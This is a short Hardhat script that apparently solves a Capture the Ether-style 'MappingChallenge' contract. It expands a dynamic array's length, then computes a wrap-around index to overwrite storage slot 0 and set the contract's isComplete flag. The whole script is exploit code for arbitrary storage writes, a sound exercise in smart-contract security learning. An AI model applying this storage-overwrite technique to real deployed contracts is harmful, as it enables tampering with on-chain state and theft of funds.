import { ethers } from 'hardhat';
const { utils, BigNumber } = ethers;

const address = '0x5a8C2fBfADae1EDeb32e8B9f2D90B6F03CD52A37';

async function main() {
  const targetFactory = await ethers.getContractFactory('MappingChallenge');
  const target = await targetFactory.attach(address);
  await target.deployed();

  console.log('Target deployed to:', target.address);

  let tx;

  console.log('1 - Adding padding');
  // extending array out of limits
  tx = await target.set(BigNumber.from(`2`).pow(`256`).sub(`2`), 2);
  await tx.wait();

  // map[0] value is stored at keccak(p) = keccak(1)
  // needs to be padded to a 256 bit
  const mapZeroDirection = `0x0000000000000000000000000000000000000000000000000000000000000001`;
  const mapDataBegin = BigNumber.from(utils.keccak256(mapZeroDirection));

  const isCompleteOffset = BigNumber.from(`2`).pow(`256`).sub(mapDataBegin);

  console.log('2 - Overriding isComplete');
  tx = await target.set(isCompleteOffset, `1`);
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
